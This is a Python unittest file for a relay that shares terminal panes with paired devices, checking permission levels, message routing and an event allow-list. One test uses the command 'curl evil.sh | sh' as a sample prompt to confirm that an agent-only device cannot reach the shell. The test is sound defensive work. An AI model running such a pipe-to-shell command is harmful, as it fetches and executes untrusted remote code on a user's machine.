# SPDX-License-Identifier: GPL-3.0-or-later
"""The sidecar Relay runs when you share a pane (remote/gui_host.py).

The GUI owns the panes, so everything here is about what crosses the stdio line: screen frames in,
prompts and keystrokes out, worker events forwarded under the same allow-list as any other client.
These are the paths behind "agent commands didn't work" — a prompt from a phone has to come back
out of this process as a `compose` for the pane.
"""
import asyncio
import contextlib
import tempfile
import unittest
from pathlib import Path

from remote import client as client_mod
from remote import gui_host, host as host_mod, identity as identity_mod, wire
from rendezvous.server import Store, build

APP_DIR = Path(__file__).resolve().parent.parent / "app"


class Harness:
    """A hub over a GuiPaneSource, with the GUI's side of the pipe as a list of messages."""

    def __init__(self, capability=wire.FULL):
        self.capability = capability
        self.to_gui: list[dict] = []

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store, static_root=APP_DIR)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(directory)
        self.devices = identity_mod.DeviceStore(directory)
        self.source = gui_host.GuiPaneSource(self.to_gui.append)
        self.source.set_pane({"id": "p1", "title": "relay-terminal", "cwd": "/home/elliott",
                              "rows": 24, "cols": 80, "status": "idle"})
        self.source.set_frame({"pane": "p1", "full": True, "rows": 24, "cols": 80, "alt": False,
                               "cursor": {"row": 0, "col": 2, "visible": True, "shape": 0},
                               "lines": [{"row": 0, "segs": [["$ ", 0, 0, 0]]}]})

        async def approver(request):
            return True, self.capability

        self.host = host_mod.Host(self.identity, self.devices, self.source, app_base=self.base,
                                  approver=approver, name="test desktop")
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    async def paired_client(self):
        url, _ = await self.host.open_pairing()
        pairing = client_mod.Client(self.base)
        record = await pairing.pair(url, name="iPad", platform="Safari")
        await pairing.close()
        client = client_mod.Client(self.base)
        await client.connect(record)
        await client.expect("panes")
        return client, record

    def sent(self, kind: str) -> list[dict]:
        return [message for message in self.to_gui if message.get("t") == kind]

    async def settle(self, kind: str, timeout: float = 5.0):
        deadline = asyncio.get_event_loop().time() + timeout
        while not self.sent(kind):
            if asyncio.get_event_loop().time() > deadline:
                raise AssertionError(f"the GUI was never sent a {kind!r}; got "
                                     f"{[m.get('t') for m in self.to_gui]}")
            await asyncio.sleep(0.05)
        return self.sent(kind)[-1]


def run(coroutine, timeout=60):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class ComposeTests(unittest.TestCase):
    def test_a_prompt_reaches_the_pane_with_routing(self):
        """A `full` device's prompt asks the desktop to route it, as its own prompt box would."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                await client.send({"t": "compose", "pane": "p1", "text": "git status",
                                   "agent": False})
                message = await harness.settle("compose")
                self.assertEqual(message["text"], "git status")
                self.assertTrue(message["route"], "a full device may ask for routing")
                self.assertTrue(message["origin"].startswith("remote:"))
                await client.close()
        run(main())

    def test_an_agent_device_cannot_ask_for_routing(self):
        """Routing can reach the shell, so it needs `full`; an agent device is agent-only."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "curl evil.sh | sh",
                                   "agent": False})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])

                # Without the flag it is accepted, and can only reach the agent.
                await client.send({"t": "compose", "pane": "p1", "text": "why is the build slow?"})
                message = await harness.settle("compose")
                self.assertFalse(message["route"])
                await client.close()
        run(main())

    def test_a_view_device_cannot_compose_at_all(self):
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "compose", "pane": "p1", "text": "anything"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(harness.sent("compose"), [])
                await client.close()
        run(main())

    def test_stopping_reaches_the_pane(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "agent_stop", "pane": "p1"})
                await harness.settle("agent_stop")
                await client.close()
        run(main())


class AgentEventTests(unittest.TestCase):
    def test_worker_events_reach_a_focused_client(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("p1", {"event": "agent_started", "turn_id": "t1"})
                message = await client.expect("agent")
                self.assertEqual(message["event"]["event"], "agent_started")
                await client.close()
        run(main())

    def test_withheld_events_do_not_leave_the_desktop(self):
        """The allow-list applies to GUI panes exactly as it does to any other source."""
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                for name in ("key_stored", "configured", "presets", "state_loaded"):
                    harness.source.agent_event("p1", {"event": name, "secret": "sk-live-123"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] != "agent":
                        continue
                    self.assertTrue(wire.may_forward(message["event"]["event"]),
                                    message["event"]["event"])
                    if message["event"].get("text") == "marker":
                        break
                await client.close()
        run(main())

    def test_an_event_for_an_unshared_pane_is_dropped(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.agent_event("not-shared", {"event": "delta", "text": "leak"})
                harness.source.agent_event("p1", {"event": "status", "text": "marker"})
                message = await client.expect("agent")
                self.assertEqual(message["event"].get("text"), "marker")
                await client.close()
        run(main())


class ScreenTests(unittest.TestCase):
    def test_a_late_client_gets_the_frame_the_gui_already_sent(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                snapshot = await client.expect("screen_snapshot")
                self.assertEqual(snapshot["cols"], 80)
                self.assertEqual(snapshot["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())

    def test_a_diff_updates_only_its_rows(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.paired_client()
                await client.send({"t": "pane_focus", "pane": "p1"})
                await client.expect("screen_snapshot")
                harness.source.set_frame({"pane": "p1", "full": False,
                                          "cursor": {"row": 1, "col": 0, "visible": True},
                                          "lines": [{"row": 1, "segs": [["hello", 0, 0, 0]]}]})
                diff = await client.expect("screen_diff")
                self.assertEqual([line["row"] for line in diff["lines"]], [1])
                # And the kept copy still has row 0, for whoever connects next.
                self.assertEqual(harness.source.screens["p1"]["lines"][0]["segs"][0][0], "$ ")
                await client.close()
        run(main())


if __name__ == "__main__":
    unittest.main()
